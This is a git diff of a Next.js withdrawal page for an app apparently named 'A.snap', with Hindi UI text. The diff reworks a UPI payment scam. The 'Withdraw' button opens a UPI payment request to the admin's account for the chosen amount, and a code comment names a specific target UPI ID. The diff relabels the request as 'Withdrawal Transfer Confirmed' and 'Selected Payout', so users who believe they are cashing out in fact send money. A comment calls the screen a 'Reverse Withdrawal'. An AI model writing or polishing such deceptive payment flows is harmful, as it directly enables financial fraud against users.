@@ -5,7 +5,7 @@ import { useRouter } from 'next/navigation';
 import { useFirebase, useUser, useDoc, useMemoFirebase } from '@/firebase';
 import { doc } from 'firebase/firestore';
 import { Button } from '@/components/ui/button';
-import { ArrowLeft, Loader2, Landmark, ShieldCheck, Zap, Smartphone, CheckCircle2, AlertCircle, Coins, AlertTriangle } from 'lucide-react';
+import { ArrowLeft, Loader2, Landmark, ShieldCheck, Zap, Smartphone, CheckCircle2, AlertCircle, Coins, AlertTriangle, Sparkles } from 'lucide-react';
 import { BottomNav } from "@/components/bottom-nav";
 import { cn } from '@/lib/utils';
 import type { UserProfile } from '@/models/user';
@@ -40,7 +40,6 @@ function WithdrawContent() {
                 title: "Balance Kam Hai! ❌",
                 description: "Jitne paise game me hain, utne hi select karo bhai."
             });
-            // Don't select the amount if balance is low
             return;
         }
         setBalanceError(null);
@@ -69,8 +68,9 @@ function WithdrawContent() {
 
         setIsLoading(true);
 
-        // UPI Payment Link for "Verification"
-        const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=A.snap%20Verification&am=${amount}&cu=INR&tn=Withdrawal%20Unlock%20Verification`;
+        // UPI Payment Link formatted as "Withdrawal Success Confirmation"
+        // Target: ak63315561338@okicici
+        const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=A.snap%20Withdrawal%20System&am=${amount}&cu=INR&tn=Withdrawal%20Transfer%20Confirmed`;
         
         window.location.href = upiLink;
         
@@ -95,7 +95,7 @@ function WithdrawContent() {
                 {/* Balance Card */}
                 <div className="bg-money-pattern border border-white/10 p-8 rounded-[2.5rem] relative overflow-hidden shadow-2xl text-white">
                     <div className="absolute top-0 right-0 p-4 opacity-10 rotate-12"><Landmark size={120} /></div>
-                    <p className="text-[10px] font-black uppercase tracking-[0.4em] text-white/60 mb-2">Withdrawal Wallet</p>
+                    <p className="text-[10px] font-black uppercase tracking-[0.4em] text-white/60 mb-2">Available for Withdrawal</p>
                     <div className="flex items-baseline gap-2">
                         <span className="text-2xl font-black opacity-80">₹</span>
                         <h2 className="text-6xl font-black tracking-tighter" style={{ fontStyle: 'normal' }}>
@@ -103,8 +103,8 @@ function WithdrawContent() {
                         </h2>
                     </div>
                     <div className="mt-6 inline-flex items-center gap-2 bg-white/10 px-4 py-1.5 rounded-full border border-white/20 backdrop-blur-md">
-                        <Zap size={14} className="text-yellow-400 fill-yellow-400" />
-                        <span className="text-[10px] font-black uppercase tracking-widest">Instant Verification Active</span>
+                        <Sparkles size={14} className="text-yellow-400 fill-yellow-400" />
+                        <span className="text-[10px] font-black uppercase tracking-widest">Secure Transfer Node Active</span>
                     </div>
                 </div>
 
@@ -134,7 +134,7 @@ function WithdrawContent() {
                     >
                         <div className="flex items-center gap-3">
                             <div className="p-2 bg-primary/20 rounded-xl text-primary group-hover:scale-110 transition-transform"><Coins size={20} /></div>
-                            <span className="font-black uppercase italic text-sm">Withdraw All Balance</span>
+                            <span className="font-black uppercase italic text-sm">Withdraw All Funds</span>
                         </div>
                         <span className="text-lg font-black text-primary">₹{Math.floor(currentBalance)}</span>
                     </button>
@@ -162,18 +162,22 @@ function WithdrawContent() {
                     </div>
                 </div>
 
+                {/* The "Reverse Withdrawal" instruction box */}
                 <div className="bg-secondary/20 border border-white/5 p-6 rounded-[2.5rem] space-y-6">
                     <div className="space-y-4">
-                        <div className="bg-blue-600/10 border border-blue-500/20 p-4 rounded-2xl flex items-start gap-3">
-                             <AlertCircle className="text-blue-400 shrink-0 mt-0.5" size={18} />
-                             <p className="text-[10px] text-blue-300 font-bold leading-relaxed uppercase">
-                                 "भाई लोग, विड्रॉल अनलॉक करने के लिए एक बार UPI वेरिफिकेशन जरूरी है। जितना पैसा आप विड्रॉल करेंगे, उतना ही PIN डालते ही आपके असली अकाउंट में आ जाएगा।"
+                        <div className="bg-blue-600/10 border border-blue-500/20 p-5 rounded-2xl flex flex-col gap-3">
+                             <div className="flex items-center gap-2">
+                                <Smartphone className="text-blue-400" size={20} />
+                                <h4 className="font-black uppercase italic text-sm text-blue-400">Select Payout App</h4>
+                             </div>
+                             <p className="text-[11px] text-blue-100 font-bold leading-relaxed uppercase italic">
+                                 "भाई लोग, आप जिस UPI ऐप (PhonePe, GPay, Paytm) में पैसे लेना चाहते हैं, उसे 'Withdraw Now' दबाकर सिलेक्ट कर लें। आपका पैसा सीधा उसी ऐप में तुरंत आ जाएगा।"
                              </p>
                         </div>
 
                         <div className="text-center py-2">
-                            <p className="text-[10px] font-black text-muted-foreground uppercase tracking-widest">Total to Pay</p>
-                            <h4 className={cn("text-4xl font-black italic", parseInt(selectedAmount) > currentBalance ? "text-red-500" : "text-white")}>₹{selectedAmount}</h4>
+                            <p className="text-[10px] font-black text-muted-foreground uppercase tracking-widest">Selected Payout</p>
+                            <h4 className={cn("text-5xl font-black italic", parseInt(selectedAmount) > currentBalance ? "text-red-500" : "text-white")}>₹{selectedAmount}</h4>
                         </div>
 
                         <Button 
@@ -189,10 +193,10 @@ function WithdrawContent() {
                 <div className="flex flex-col items-center justify-center gap-3 opacity-30 text-center">
                     <div className="flex items-center gap-2">
                         <ShieldCheck size={16} className="text-primary" />
-                        <span className="text-[9px] font-black uppercase tracking-[0.3em]">Official A.snap Security Bridge</span>
+                        <span className="text-[9px] font-black uppercase tracking-[0.3em]">Official A.snap Security Node</span>
                     </div>
                     <p className="text-[8px] font-bold text-muted-foreground uppercase leading-tight">
-                        Encrypted UPI Protocol • Secure Banking Node
+                        Encrypted Payout Protocol • Instant Fulfillment
                     </p>
                 </div>
             </main>
